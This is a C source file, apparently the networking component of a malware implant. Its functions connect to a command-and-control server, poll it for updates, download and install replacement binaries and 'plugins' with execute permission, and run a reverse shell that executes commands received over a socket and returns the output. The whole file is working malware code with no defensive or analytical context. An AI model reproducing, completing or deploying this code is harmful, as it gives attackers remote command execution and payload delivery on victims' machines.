#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <curl/curl.h>
#include <openssl/sha.h>

#include "../include/types.h"
#include "network_utils.h"

size_t f_write_data(void *ptr, size_t size, size_t nmemb, FILE *stream)
{
	size_t written = fwrite(ptr, size, nmemb, stream);
	return written;
}

size_t s_write_data(void *ptr, size_t size, size_t nmemb, char *output)
{
	if (size != 1)
		return ERROR;

	size_t written = snprintf(output, nmemb, "%s", (char *)ptr);

	return written;
}

int connect_cc(char *ip_adrr, int port, int *socket_desc,
	       struct sockaddr_in *server, int isTCP)
{
	if (isTCP) // 1
		(*socket_desc) = socket(AF_INET, SOCK_STREAM, 0);
	else // 0
		(*socket_desc) = socket(AF_INET, SOCK_DGRAM, 0);

	if ((*socket_desc) == ERROR) {
#ifdef DEBUG
		printf("Error creating socket\n");
#endif
		return ERROR;
	}

	if (isTCP)
		server->sin_addr.s_addr = inet_addr(ip_adrr);

	server->sin_family = AF_INET;
	server->sin_port = htons(port);

	if (connect(*socket_desc, (struct sockaddr *)&(*server),
		    sizeof(*server)) < 0) {
#ifdef DEBUG
		printf("Error connecting\n");
#endif
		return ERROR;
	}

	return OK;
}

int check_update(char *ip_addr, int *state)
{
	CURL *curl = NULL;
	CURLcode res = 0;
	char *result = NULL;

	result = (char *)calloc(STD_SIZE, sizeof(char));
	if (!result)
		return ERROR;

	curl = curl_easy_init();
	if (!curl) {
		free(result);
		return ERROR;
	}

	curl_easy_setopt(curl, CURLOPT_URL, ip_addr);
	curl_easy_setopt(curl, CURLOPT_PORT, 8000);
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, s_write_data);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, result);

	res = curl_easy_perform(curl);
	if (res != CURLE_OK) {
		curl_easy_cleanup(curl);
		free(result);
		return ERROR;
	}

	*state = atoi(result);

	curl_easy_cleanup(curl);
	free(result);

	return OK;
}

int download_file(char *ip_addr, int type)
{
	FILE *download = NULL;
	CURL *curl = NULL;
	CURLcode res = 0;
	char file_name[32] = HOME"/plugins/p";
	int i = 0;
	char num[32] = { 0 };

	curl = curl_easy_init();
	if (!curl)
		return ERROR;

	printf(HOME"/download.tmp\n");
	download = fopen(HOME"/download.tmp", "w");
	if (!download)
		return ERROR;

	curl_easy_setopt(curl, CURLOPT_URL, ip_addr);
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, f_write_data);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, download);
	res = curl_easy_perform(curl);
	if (res != CURLE_OK)
		return ERROR;

	if (type == 0) // UPDATE
	{
		if (access(HOME"/updates/"NAME, F_OK) != -1) {
			if (remove(HOME"/updates/"NAME) != 0)
				return ERROR;
		}

		rename(HOME"/"NAME, HOME"/updates/"NAME);
		rename(HOME"/download.tmp", HOME"/"NAME);

		chmod(HOME"/"NAME, S_IXUSR | S_IXGRP | S_IXOTH);
	} else // PLUGIN
	{
		strcpy(file_name, HOME"/plugins/p");
		sprintf(num, "%d", i);
		strcat(file_name, num);

		while (access(file_name, F_OK) != -1) {
			i++;
			strcpy(file_name, HOME"/plugins/p");
			sprintf(num, "%d", i);
			strcat(file_name, num);
		}

		rename(HOME"/download.tmp", file_name);

		chmod(file_name, S_IXUSR | S_IXGRP | S_IXOTH);
	}

	return OK;
}

int reverse_shell(char *ip_addr, int port)
{
	int socket_desc = 0;
	struct sockaddr_in server;
	char command[STD_SIZE] = { 0 };
	char *welcome_message = "Connected to shell\n$ ";
	char *command_output = NULL;

	if (connect_cc(ip_addr, port, &socket_desc, &server, 1) == ERROR) {
#ifdef DEBUG
		printf("Error connecting to C2 server\n");
#endif
		return ERROR;
	}

	if (send(socket_desc, welcome_message, strlen(welcome_message), 0) ==
	    ERROR) {
#ifdef DEBUG
		printf("Error sending output of command\n");
#endif
		return ERROR;
	}

	while (strncmp(command, EXIT_COMMAND, strlen(EXIT_COMMAND) - 1) != 0) {
		if (recv(socket_desc, command, STD_SIZE, 0) == ERROR) {
#ifdef DEBUG
			printf("Error receiving command\n");
#endif
			return ERROR;
		}

#ifdef DEBUG
		printf("COMMAND > %s\n", command);
#endif

		exec(command, &command_output);

		strcat(command_output, "\n$ ");

		if (send(socket_desc, command_output, strlen(command_output),
			 0) == ERROR) {
#ifdef DEBUG
			printf("Error sending output of command\n");
#endif
			return ERROR;
		}

		free(command_output);
	}

	return OK;
}